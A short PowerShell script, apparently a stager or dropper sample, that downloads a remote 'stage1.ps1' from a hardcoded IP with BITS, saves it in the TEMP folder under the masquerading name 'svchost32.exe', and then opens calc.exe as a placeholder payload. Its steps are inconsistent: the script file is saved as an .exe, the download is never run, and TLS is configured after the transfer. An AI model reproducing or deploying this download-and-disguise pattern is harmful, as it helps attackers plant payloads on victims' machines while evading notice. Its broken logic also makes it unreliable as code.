
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'http://192.0.2.83/stage1.ps1',
    [string]$LocalPath = "$env:TEMP\svchost32.exe",
    [int]$RequestTimeout = 65
)
Start-BitsTransfer -Source $RemoteUrl -Destination $LocalPath
Start-Process -FilePath "calc.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
